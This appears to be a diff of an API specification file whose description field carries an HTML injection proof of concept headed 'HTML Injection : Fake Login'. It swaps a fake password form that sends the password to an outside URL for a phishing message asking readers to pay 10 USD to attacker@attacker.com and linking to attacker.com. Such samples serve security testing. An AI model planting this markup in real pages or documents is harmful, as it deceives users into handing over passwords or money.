@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-     <form action="https://raw.githubusercontent.com?password=">Enter password to Proceed: <input name="password" type="text" value="" > <br /><br /> <input type="submit" value="Submit" /></form>
+     <p>You can get pro account by sending us 10 USD through our official paypal attacker@attacker.com.<br>For more information Sign in and claim your offer from <a href="attacker.com">here</a></p><p>Regards</p><p>Invoiced Admin</p> 
     </div>
 </div>'
 paths:
